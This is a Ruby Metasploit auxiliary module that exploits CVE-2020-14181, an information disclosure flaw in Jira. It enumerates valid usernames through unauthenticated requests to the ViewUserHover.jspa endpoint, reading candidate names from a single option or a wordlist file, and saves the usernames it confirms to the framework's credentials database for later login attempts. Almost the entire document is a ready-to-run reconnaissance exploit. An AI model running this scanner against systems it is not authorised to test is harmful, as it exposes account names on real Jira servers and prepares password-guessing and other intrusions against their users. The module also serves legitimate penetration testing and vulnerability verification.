##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jira Users Enumeration',
        'Description' => %q{
          This module exploits an information disclosure vulnerability that allows an
          unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
          This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.12.0
          Discovered by Mikhail Klyuchnikov @__mn1__
          This module was only tested on 8.4.1
        },
        'Author' => [ 'Brian Halbach' ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
            ['CVE', '2020-14181'],
          ],
        'DisclosureDate' => '2020-08-16'
      )
    )
    register_options(
      [
        # Opt::RPORT(443),
        # Opt::SSL(true),
        OptString.new('TARGETURI', [true, 'Jira Path', '/']),
        OptString.new('USERNAME', [ false, 'Single username to test']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line'])
      ]
    )
  end

  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa?username=")
  end


  # I was having issues with handling the username vs user_file so I copied and pasted this function from another module to fix it
  def user_list
    users = []

    if datastore['USERNAME']
      users << datastore['USERNAME']
    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    users
  end

  def run_host(_ip)
    # Main method
    # removed the check because it was not consistent
    # unless check_host(ip) == Exploit::CheckCode::Appears
    #  print_error("#{ip} does not appear to be vulnerable, will not continue")
    #  return
    # end

    users = user_list
    if users.empty?
      print_error('Please populate USERNAME or USER_FILE')
      return
    end

    print_status("Begin enumerating users at #{vhost}#{base_uri}")

    user_list.each do |user|
      print_status("checking user #{user}")
      res = send_request_cgi!(
        'uri' => "#{base_uri}#{user}",
        'method' => 'GET',
        'headers' => { 'Connection' => 'Close' }
      )
      # print_status(res.body) was manually reading the response while troubleshooting
      if res.body.include?('User does not exist')
        print_bad("'User #{user} does not exist'")
      elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other verions
        print_good("'User exists: #{user}'")
        # use the report_creds function to add the username to the creds db
      connection_details = {
          module_fullname: self.fullname,
          username: user,
          workspace_id: myworkspace_id,
          status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_details)
      create_credential_and_login(connection_details)
      else
        print_error('No response')
      end
    end

  end

end
